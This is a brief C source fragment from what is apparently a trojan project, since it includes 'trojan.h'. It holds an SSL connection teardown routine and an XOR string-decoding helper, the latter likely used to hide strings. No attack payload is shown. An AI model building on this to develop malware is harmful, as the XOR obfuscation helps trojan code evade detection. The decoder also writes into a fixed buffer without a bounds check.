#include "trojan.h"

void ft_shutdown(t_args *args) {
    SSL_shutdown(args->ssl);
    SSL_free(args->ssl);
    close(args->client_socket);
    free(args);
}


void decode(int *data, char *decoded, int key, int n) {
    memset(decoded, 0, 50);
    for (int i = 0; i < n; i++) {
        decoded[i] = data[i] ^ key;
    }
}